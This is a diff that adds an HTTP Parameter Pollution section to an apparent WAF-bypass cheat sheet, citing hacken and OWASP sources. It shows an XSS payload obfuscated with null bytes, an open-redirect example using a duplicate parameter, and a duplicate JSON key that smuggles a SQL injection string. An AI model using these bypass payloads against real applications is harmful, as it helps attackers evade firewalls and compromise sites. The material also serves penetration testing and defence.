@@ -418,6 +418,45 @@ X-Client-IP: 127.0.0.1
 <s%00c%00r%00%00ip%00t>confirm(0);</s%00c%00r%00%00ip%00t>
 ```
 
+## 18. HTTP Parameter Pollution
+* This attack method is based on how a server interprets parameters with the same names.
+* Possible bypass chances here are:
+    * The server uses the last received parameter, and WAF checks only the first.
+    * The server unites the value from similar parameters, and WAF checks them separately.
+
+
+```
+http://example.com/home?redirectURL=internalPage
+
+malicious code
+
+http://example.com/home?redirectURL=internalPage&redirectURL=http://malicious.com
+```
+
+```
+POST /payslip HTTP/1.1
+Host: vulnerable.dev
+
+{
+    "month" : "March",
+    "year" : "2010"
+}
+
+malicious code
+
+POST /payslip HTTP/1.1
+Host: vulnerable.dev
+
+{
+    "month" : "March",
+    "year" : "2010",
+    "month" : "April' and 1=1 -- a"
+}
+```
+
+
+
+
 
 
 ## Tools
@@ -428,3 +467,6 @@ X-Client-IP: 127.0.0.1
 
 
 
+### references
+* [hacken](https://hacken.io/discover/how-to-bypass-waf-hackenproof-cheat-sheet/)
+* [owasp waf bypass](https://owasp.org/www-pdf-archive/OWASP_Stammtisch_Frankfurt_-_Web_Application_Firewall_Bypassing_-_how_to_defeat_the_blue_team_-_2015.10.29.pdf)
